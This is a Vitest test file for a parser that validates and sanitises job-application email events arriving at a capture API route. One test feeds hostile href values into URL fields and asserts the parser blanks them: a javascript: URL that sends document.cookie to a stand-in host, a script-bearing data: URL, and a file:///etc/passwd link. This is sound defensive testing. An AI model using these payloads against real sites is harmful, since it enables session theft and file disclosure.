import { describe, expect, it } from "vitest";
import {
  EVENT_FIELDS,
  EVENT_TYPES,
  MAX_EVENTS,
  normalizeStamp,
  parseBatch,
  parseEvent,
  storable,
} from "@/lib/capture/schema";

const NUL = "\u0000";

/**
 * The closed-set parser at `/api/capture`'s boundary.
 *
 * Matrix row 38's rule ("a server action accepts any payload the client sends";
 * a route handler more so) applied to a body that arrives from a Google server
 * carrying whatever an LLM classifier produced. Every assertion here is a shape
 * the sender can really produce or a shape a mistake really makes.
 *
 * MUTATION TARGETS — each was run red before green:
 *   * drop the unknown-field check           -> the renamed-field test passes a
 *                                               dropped column as success
 *   * drop the component round-trip in       -> `2026-02-31T00:00:00Z` is accepted
 *     `normalizeStamp`                          and silently becomes March 3rd
 *   * accept a blank `event_id`              -> the dedup-key test stops refusing
 *   * `confidence <= 1` -> `< 2`             -> the out-of-range test passes
 *   * make `received_at` optional            -> the missing-stamp test passes
 */

/** The row `buildEvent_` + `classify_` really produce, as JSON. */
function wireEvent(over: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    event_id: "<CAKx=1@mail.gmail.com>",
    account: "main",
    received_at: "2026-07-27T14:02:11Z",
    from: "Ramp Recruiting <no-reply@greenhouse.io>",
    subject: "Thank you for applying to Ramp",
    snippet: "We received your application for Product Manager.",
    event_type: "received",
    company: "Ramp",
    title: "Product Manager",
    ats: "greenhouse",
    job_url: "https://boards.greenhouse.io/ramp/jobs/1",
    confidence: 0.93,
    evidence: "We received your application",
    thread_link: "https://mail.google.com/mail/u/0/#all/18f",
    processed_at: "2026-07-27 14:02:19Z",
    ...over,
  };
}

describe("the envelope", () => {
  it("takes {events: [...]}", () => {
    const parsed = parseBatch({ events: [wireEvent()] });
    expect(parsed.ok).toBe(true);
  });

  it("refuses a body that is not an object, and one that is an array", () => {
    for (const body of [null, 42, "events", [wireEvent()]]) {
      const parsed = parseBatch(body);
      expect(parsed.ok, `accepted ${JSON.stringify(body)}`).toBe(false);
    }
  });

  it("refuses an envelope carrying anything besides events, and names it", () => {
    const parsed = parseBatch({ events: [wireEvent()], account: "main", version: 2 });
    expect(parsed.ok).toBe(false);
    if (parsed.ok) return;
    // Named, because the point of refusing is that somebody can fix it. A
    // rejection saying only "bad body" would send them to read this file.
    expect(parsed.reason).toMatch(/account, version/);
  });

  it("refuses an empty batch rather than answering 200 to nothing", () => {
    const parsed = parseBatch({ events: [] });
    expect(parsed.ok).toBe(false);
  });

  it("refuses more events than the cap and states both numbers", () => {
    const parsed = parseBatch({ events: Array.from({ length: MAX_EVENTS + 1 }, () => wireEvent()) });
    expect(parsed.ok).toBe(false);
    if (parsed.ok) return;
    expect(parsed.reason).toMatch(new RegExp(`${MAX_EVENTS + 1}.*${MAX_EVENTS}`));
  });
});

describe("one event", () => {
  it("accepts the row the Apps Script builds, verbatim", () => {
    const parsed = parseEvent(wireEvent());
    expect(parsed.ok).toBe(true);
    if (!parsed.ok) return;
    expect(parsed.row.event_id).toBe("<CAKx=1@mail.gmail.com>");
    // The one rename between the wire and the column, exercised rather than
    // described: `from` is a reserved word in SQL.
    expect(parsed.row.from_addr).toBe("Ramp Recruiting <no-reply@greenhouse.io>");
    expect(parsed.row).not.toHaveProperty("from");
    // Both stamp shapes the script writes, normalized to one.
    expect(parsed.row.received_at).toBe("2026-07-27T14:02:11.000Z");
    expect(parsed.row.processed_at).toBe("2026-07-27T14:02:19.000Z");
  });

  it("fills every optional text field with '' rather than undefined", () => {
    const parsed = parseEvent({
      event_id: "<a@b>",
      received_at: "2026-07-27T14:02:11Z",
      event_type: "other",
    });
    expect(parsed.ok).toBe(true);
    if (!parsed.ok) return;
    // Anchored emptiness, the same rule the columns carry: '' is a value, and
    // `undefined` reaching `JSON.stringify` would drop the key entirely and let
    // the SQL default decide — a second opinion about what blank means.
    expect(parsed.row.company).toBe("");
    expect(parsed.row.thread_link).toBe("");
    expect(parsed.row.confidence).toBe(0);
    expect(parsed.row.processed_at).toBeNull();
  });

  it("REJECTS an unknown field and names it", () => {
    // The whole argument for rejecting rather than ignoring: a sender that
    // renames `from` must fail loudly, not post half a row forever.
    const { from, ...rest } = wireEvent();
    const parsed = parseEvent({ ...rest, from_address: from });
    expect(parsed.ok).toBe(false);
    if (parsed.ok) return;
    expect(parsed.reason).toMatch(/unknown field\(s\): from_address/);
  });

  it("rejects the joiner's own columns — they are not the sender's to write", () => {
    for (const field of ["matched_key", "applied_status"]) {
      const parsed = parseEvent(wireEvent({ [field]: "x" }));
      expect(parsed.ok, `accepted ${field}`).toBe(false);
    }
  });

  it("rejects a blank event_id — the dedup key cannot be empty", () => {
    for (const id of ["", "   ", undefined]) {
      const parsed = parseEvent(wireEvent({ event_id: id }));
      expect(parsed.ok, `accepted ${JSON.stringify(id)}`).toBe(false);
      if (parsed.ok) return;
      expect(parsed.reason).toMatch(/event_id/);
    }
  });

  it("rejects an event_type outside the closed set and lists the set", () => {
    const parsed = parseEvent(wireEvent({ event_type: "maybe" }));
    expect(parsed.ok).toBe(false);
    if (parsed.ok) return;
    expect(parsed.reason).toContain("recruiter_outreach");
  });

  it("accepts every event_type the classifier can emit", () => {
    for (const t of EVENT_TYPES) {
      expect(parseEvent(wireEvent({ event_type: t })).ok, t).toBe(true);
    }
  });

  it("rejects a confidence outside 0..1, and takes one written as a string", () => {
    for (const bad of [-0.1, 1.1, 42, "abc", NaN, Infinity]) {
      expect(parseEvent(wireEvent({ confidence: bad })).ok, `accepted ${bad}`).toBe(false);
    }
    const asText = parseEvent(wireEvent({ confidence: "0.5" }));
    expect(asText.ok).toBe(true);
    if (!asText.ok) return;
    expect(asText.row.confidence).toBe(0.5);
  });

  it("rejects a non-string where a string belongs", () => {
    expect(parseEvent(wireEvent({ subject: 42 })).ok).toBe(false);
    expect(parseEvent(wireEvent({ company: ["Ramp"] })).ok).toBe(false);
  });

  it("bounds every text field, so a token is not a way to fill a column", () => {
    expect(parseEvent(wireEvent({ subject: "a".repeat(2001) })).ok).toBe(false);
    expect(parseEvent(wireEvent({ subject: "a".repeat(2000) })).ok).toBe(true);
  });

  it("requires a received_at and will not guess one", () => {
    const missing = parseEvent(wireEvent({ received_at: "" }));
    expect(missing.ok).toBe(false);
    if (missing.ok) return;
    expect(missing.reason).toMatch(/received_at is missing/);
  });

  it("refuses an event that is not an object at all", () => {
    for (const raw of [null, 42, "x", ["a"]]) {
      expect(parseEvent(raw).ok, `accepted ${JSON.stringify(raw)}`).toBe(false);
    }
  });
});

describe("normalizeStamp — a regexp is a shape, not a moment", () => {
  it("takes both shapes the Apps Script writes", () => {
    expect(normalizeStamp("2026-07-27T14:02:11Z")).toBe("2026-07-27T14:02:11.000Z");
    // `core/sheets._now()`'s shape, which `nowStamp_` mirrors so every bot
    // timestamp in the spreadsheet parses identically.
    expect(normalizeStamp("2026-07-27 14:02:19Z")).toBe("2026-07-27T14:02:19.000Z");
    expect(normalizeStamp("2026-07-27T14:02:11.500Z")).toBe("2026-07-27T14:02:11.500Z");
  });

  it("REFUSES a day that does not exist, which Date.parse does not", () => {
    // The reason the round-trip check exists at all: V8 answers March 3rd for
    // this, so a shape-only check would accept it and store a different day.
    expect(Number.isNaN(Date.parse("2026-02-31T00:00:00Z"))).toBe(false);
    expect(normalizeStamp("2026-02-31T00:00:00Z")).toBeNull();
    expect(normalizeStamp("2026-13-01T00:00:00Z")).toBeNull();
    expect(normalizeStamp("2026-07-27T25:00:00Z")).toBeNull();
    expect(normalizeStamp("2026-07-27T14:60:00Z")).toBeNull();
  });

  it("takes a real leap day and refuses a fake one", () => {
    expect(normalizeStamp("2028-02-29T00:00:00Z")).toBe("2028-02-29T00:00:00.000Z");
    expect(normalizeStamp("2026-02-29T00:00:00Z")).toBeNull();
  });

  it("refuses anything that is not UTC, rather than assuming a zone", () => {
    for (const s of [
      "2026-07-27T14:02:11",
      "2026-07-27T14:02:11+02:00",
      "2026-07-27",
      "Jul 27 2026",
      " 2026-07-27T14:02:11Z ",
      "",
    ]) {
      expect(normalizeStamp(s), `accepted ${JSON.stringify(s)}`).toBeNull();
    }
  });
});

describe("storable — the two character classes Postgres refuses ABOVE the per-row block", () => {
  it("strips NUL and repairs an unpaired surrogate", () => {
    expect(storable(`a${NUL}b`)).toBe("ab");
    expect(storable("a\ud83c")).toBe("a\ufffd");
    expect(storable("a\udfaf")).toBe("a\ufffd");
    expect(storable("a\ud83c\udfafb")).toBe("a\u{1F3AF}b"); // a WHOLE emoji is untouched
  });

  it("leaves ordinary content byte-for-byte alone", () => {
    for (const s of ["", "plain", "unicode — 日本語 — 🎯", "tabs\tand\nnewlines", "'; drop table"]) {
      expect(storable(s), JSON.stringify(s)).toBe(s);
    }
  });
});

describe("the poison a truncated emoji makes", () => {
  it("repairs it in CONTENT rather than losing the event", () => {
    // The reachable case: `Code.gs` cut `snippet` at 300 UTF-16 units and an
    // emoji straddled the boundary. Losing one character of a snippet is
    // invisible; losing the status change is not.
    const parsed = parseEvent(wireEvent({ snippet: `We received your application \ud83c` }));
    expect(parsed.ok).toBe(true);
    if (!parsed.ok) return;
    expect(parsed.row.snippet.isWellFormed()).toBe(true);
    expect(parsed.row.snippet.startsWith("We received")).toBe(true);
  });

  it("strips a NUL from every text field", () => {
    const parsed = parseEvent(
      wireEvent({ subject: `Offer${NUL}`, company: `Ramp${NUL}`, evidence: `q${NUL}` }),
    );
    expect(parsed.ok).toBe(true);
    if (!parsed.ok) return;
    expect(JSON.stringify(parsed.row)).not.toContain("\\u0000");
    expect(parsed.row.subject).toBe("Offer");
  });

  it("REFUSES the same poison in event_id, because that one is the identity", () => {
    // Everywhere else the repair is invisible. Here it would invent a key: two
    // different poisoned ids can normalise to the same string, and a replay of
    // the same message must find the same row.
    for (const id of [`<a${NUL}b@x>`, "<a\ud83c@x>", "<a\udfaf@x>"]) {
      const parsed = parseEvent(wireEvent({ event_id: id }));
      expect(parsed.ok, `accepted ${JSON.stringify(id)}`).toBe(false);
      if (parsed.ok) return;
      expect(parsed.reason).toMatch(/event_id carries a NUL or an unpaired surrogate/);
    }
  });

  it("bounds the field AFTER repairing it, not before", () => {
    // Order matters: the cap must apply to what is actually stored.
    const parsed = parseEvent(wireEvent({ subject: NUL.repeat(500) + "x".repeat(2000) }));
    expect(parsed.ok).toBe(true);
    if (!parsed.ok) return;
    expect(parsed.row.subject).toHaveLength(2000);
  });
});

describe("a blank event_id, tested the way the STORE tests it", () => {
  it("refuses a zero-width-only id, which String.trim() does not strip", () => {
    // 0018's CHECK is `hq_blank_trim(event_id) <> ''`, which strips
    // U+200B/200C/200D/FEFF. `.trim()` strips none of them, so this row used to
    // pass the route and come back from Postgres as a raw constraint name — the
    // exact failure the parity file exists to prevent.
    for (const id of ["\u200b", "\ufeff \u200d", " \u200c "]) {
      const parsed = parseEvent(wireEvent({ event_id: id }));
      expect(parsed.ok, `accepted ${JSON.stringify(id)}`).toBe(false);
      if (parsed.ok) return;
      expect(parsed.reason).toMatch(/blank/);
    }
  });

  it("still accepts an id that merely CONTAINS one, and stores it verbatim", () => {
    const parsed = parseEvent(wireEvent({ event_id: "<a\u200bb@x>" }));
    expect(parsed.ok).toBe(true);
    if (!parsed.ok) return;
    // Not normalised: the key is stored exactly as sent, or a replay misses it.
    expect(parsed.row.event_id).toBe("<a\u200bb@x>");
  });
});

describe("the two fields that become an href — content, not identity", () => {
  /**
   * THE REVIEWER'S OWN INPUTS. The first version of this guard refused the whole
   * EVENT for any non-http(s) value, so an interview notification whose
   * `job_url` said "not specified" was dropped — measured, and contrary to the
   * rule `storable()` states twenty lines above it. `Code.gs` does not
   * pre-validate: whatever Haiku puts in that field decides whether a status
   * change survives.
   */
  const BENIGN: [string, string][] = [
    ["N/A", ""],
    ["not specified", ""],
    ["www.ramp.com/careers", "https://www.ramp.com/careers"],
    ["/jobs/1234", ""],
    ["See the link in the email", ""],
    ["mailto:jobs@ramp.com", ""],
    [" https://x.co/j", "https://x.co/j"],
    ["   ", ""],
  ];

  it.each(BENIGN)("keeps the event for job_url %j and stores %j", (input, expected) => {
    const parsed = parseEvent(wireEvent({ event_type: "interview", job_url: input }));
    expect(parsed.ok, `refused the event for ${JSON.stringify(input)}`).toBe(true);
    if (!parsed.ok) return;
    expect(parsed.row.job_url).toBe(expected);
    expect(parsed.row.event_type).toBe("interview"); // the event is intact
  });

  it("says so when it blanked something, and stays quiet when it did not", () => {
    // A repair nobody is told about is a silent edit.
    const dropped = parseEvent(wireEvent({ job_url: "N/A" }));
    expect(dropped.ok).toBe(true);
    if (!dropped.ok) return;
    expect(dropped.note).toMatch(/job_url dropped, not an http\(s\) URL: "N\/A"/);

    // A trim and a `www.` repair are unambiguous, so they are not worth a note.
    for (const url of [" https://x.co/j", "www.ramp.com/careers", "https://ok.test/j"]) {
      const clean = parseEvent(wireEvent({ job_url: url }));
      expect(clean.ok).toBe(true);
      if (!clean.ok) return;
      expect(clean.note, url).toBeUndefined();
    }
  });

  it("blanks every dangerous scheme rather than storing a one-click", () => {
    // Blanking, not refusing — same answer as for prose, and correct for the
    // same reason: neither is a URL, and neither may reach an `href`. The note
    // is what keeps this one from being invisible.
    for (const url of [
      "javascript:fetch('//evil/'+document.cookie)",
      "data:text/html,<script>alert(1)</script>",
      "vbscript:msgbox",
      "file:///etc/passwd",
      "//evil.example.com/x",
      "JavaScript:alert(1)",
      "\tjavascript:alert(1)",
    ]) {
      const parsed = parseEvent(wireEvent({ job_url: url }));
      expect(parsed.ok, `refused the event for ${url}`).toBe(true);
      if (!parsed.ok) return;
      expect(parsed.row.job_url, url).toBe("");
      expect(parsed.note, url).toMatch(/job_url dropped/);
    }
  });

  it("only repairs a www. host, never guesses one for a bare path", () => {
    // `www.` cannot start a scheme and cannot start a path, so there is exactly
    // one thing it can mean. `/jobs/1234` would need an invented host.
    expect(
      (parseEvent(wireEvent({ job_url: "www.a.co" })) as { row: { job_url: string } }).row.job_url,
    ).toBe("https://www.a.co");
    for (const nope of ["www.", "www.x", "wwwramp.com", "/jobs/1", "ramp.com/jobs"]) {
      const parsed = parseEvent(wireEvent({ job_url: nope }));
      expect(parsed.ok).toBe(true);
      if (!parsed.ok) return;
      expect(parsed.row.job_url, nope).toBe("");
    }
  });

  it("guards thread_link the same way", () => {
    const parsed = parseEvent(wireEvent({ thread_link: "javascript:alert(1)" }));
    expect(parsed.ok).toBe(true);
    if (!parsed.ok) return;
    expect(parsed.row.thread_link).toBe("");
    expect(parsed.note).toMatch(/thread_link dropped/);
  });

  it("accepts http, https and blank untouched", () => {
    for (const url of ["", "http://x.test/j/1", "https://boards.greenhouse.io/r/jobs/1"]) {
      const parsed = parseEvent(wireEvent({ job_url: url }));
      expect(parsed.ok, url).toBe(true);
      if (!parsed.ok) return;
      expect(parsed.row.job_url).toBe(url);
    }
  });
});

describe("the field list", () => {
  it("carries no duplicates and no joiner columns", () => {
    expect(new Set(EVENT_FIELDS).size).toBe(EVENT_FIELDS.length);
    expect(EVENT_FIELDS).not.toContain("matched_key");
    expect(EVENT_FIELDS).not.toContain("applied_status");
  });
});
